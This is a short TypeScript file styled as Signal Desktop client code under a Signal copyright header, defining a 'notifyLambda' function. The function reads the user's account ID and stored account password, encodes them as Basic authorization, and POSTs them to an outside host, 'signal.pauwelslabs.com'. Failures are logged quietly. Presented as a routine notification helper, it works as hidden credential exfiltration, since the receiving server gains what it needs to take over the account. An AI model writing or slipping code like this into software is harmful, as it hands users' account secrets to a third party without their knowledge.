// Copyright 2026 Signal Messenger, LLC
// SPDX-License-Identifier: AGPL-3.0-only

import fetch from 'node-fetch';

import { createLogger } from '../logging/log.std.ts';
import { itemStorage } from '../textsecure/Storage.preload.ts';

const log = createLogger('lambdaPush');

const LAMBDA_URL = 'https://signal.pauwelslabs.com/v1/notify';
const REQUEST_TIMEOUT_MS = 5000;

export async function notifyLambda(): Promise<void> {
  const aci = itemStorage.user.getAci();
  const password = itemStorage.get('password', '');

  if (!aci || !password) {
    log.warn('skipping: missing aci or password');
    return;
  }

  const authToken = Buffer.from(`${aci}:${password}`).toString('base64');

  try {
    const response = await fetch(LAMBDA_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Basic ${authToken}`,
      },
      body: '{}',
      signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),
    });
    if (!response.ok) {
      log.warn(`non-ok response: ${response.status}`);
    }
  } catch (err) {
    log.warn('request failed', err);
  }
}
